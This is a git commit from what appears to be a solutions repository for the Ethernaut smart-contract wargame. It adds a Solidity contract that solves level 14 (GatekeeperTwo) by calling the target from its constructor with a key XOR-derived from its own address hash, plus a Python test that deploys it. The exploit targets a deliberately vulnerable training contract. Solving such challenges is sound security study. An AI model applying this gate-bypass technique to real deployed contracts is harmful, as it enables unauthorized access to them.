7e6fe90600739283ff76c4d410015eb51d9735a7
Dmytro Khimchenko <dima.khimchenko@ackeeblockchain.com>
2024-04-02 16:13:37 +0200

    ✨ 14 lvl finished

---
+++ contracts/attacker/lv14_gatekeeper_two.sol
@@ -0,0 +1,19 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface GatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool); 
+}
+
+
+contract AttackGatekeeperTwo {
+  address private _victimAddress;
+  bytes8 private _exploitValue;
+
+  constructor(address victimAddress){
+    _victimAddress = victimAddress;
+    bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
+    GatekeeperTwo(_victimAddress).enter(payload);
+  }
+
+}
--- tests/lv14_gatekeeper_two_test.py
+++ tests/lv14_gatekeeper_two_test.py
@@ -1,17 +1,16 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv14_gatekeeper_two import GatekeeperTwo
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.attacker.lv14_gatekeeper_two import AttackGatekeeperTwo
+
 
 @default_chain.connect()
 def test_lv14():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv14()
-    exploit_lv14(contract)
+    exploit_lv14(contract, ethernaut.attacker)
     ethernaut.check_lv14(contract)
 
-def exploit_lv14(contract: GatekeeperTwo):
-    # TODO ?
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+def exploit_lv14(contract: GatekeeperTwo, attacker: Account):
+    exploitContract = AttackGatekeeperTwo.deploy(victimAddress=contract.address, from_=attacker.address)
+
